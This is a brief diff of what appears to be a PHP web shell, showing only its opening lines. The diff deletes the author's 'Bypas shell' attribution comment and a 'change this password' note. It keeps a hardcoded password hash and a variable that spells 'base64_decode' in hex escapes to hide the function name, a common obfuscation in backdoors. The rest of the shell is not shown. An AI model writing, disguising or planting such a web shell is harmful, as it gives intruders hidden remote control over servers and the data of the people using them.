@@ -1,7 +1,5 @@
 <?php
-// Bypas shell by Mr.Rm19 - ramdan19id[at]gmail.com
-
-$auth_pass = "e4141cdb47e4c4dfd9302f365438522e"; // ganti password ini
+$auth_pass = "e4141cdb47e4c4dfd9302f365438522e"; //
 
 
 $bapaku = "\x62\x61\x73\x65\x36\x34" . "\x5f\x64\x65\x63\x6f\x64\x65";
